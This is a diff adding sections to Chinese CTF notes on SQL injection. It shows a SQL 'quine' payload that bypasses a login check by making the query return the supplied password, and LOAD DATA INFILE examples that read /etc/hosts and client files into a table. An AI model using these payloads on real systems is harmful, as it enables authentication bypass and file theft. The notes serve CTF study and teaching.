@@ -77,6 +77,38 @@ admin" 在修改密码时报错，说明"闭合 二次注入，猜测 sql
 update 表 set password='xxx' where username="xx" and pwd='xx'
 ```
 
+## 其他
+
+## Quine
+[偏门SQL](https://www.b1xcy.top/tips/5QL%E6%B3%A8%E5%85%A5%E4%B8%80%E6%8A%8A%E6%A2%AD.html)
+
+输入等于输出
+```
+$row['password'] === $password
+```
+
+```sql
+-- 示例1
+select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') |
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') |
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+-- 示例2
+1' union select replace(replace('1" union select replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1" union select replace(replace(".",char(34),char(39)),char(46),".")#')#
+组合 sql 语句就是：
+SELECT password FROM users WHERE username='admin' and password='1' union select replace(replace('1" union select replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1" union select replace(replace(".",char(34),char(39)),char(46),".")#')#';
+```
+## Load data
+
+
+```sql
+LOAD DATA INFILE '/etc/hosts' INTO TABLE test FIELDS TERMINATED BY '\n';
+-- 客户端 (windows) 连接到服务端 (kali) 时, 这样就实现了远程数据的传输，当然前提是客户端的权限足够
+LOAD DATA local INFILE "D:\\test.txt" INTO TABLE test FIELDS TERMINATED BY '\n';
+```
 ## 常见的 SQL 注入考点 CTF-123458
 
 ```bash
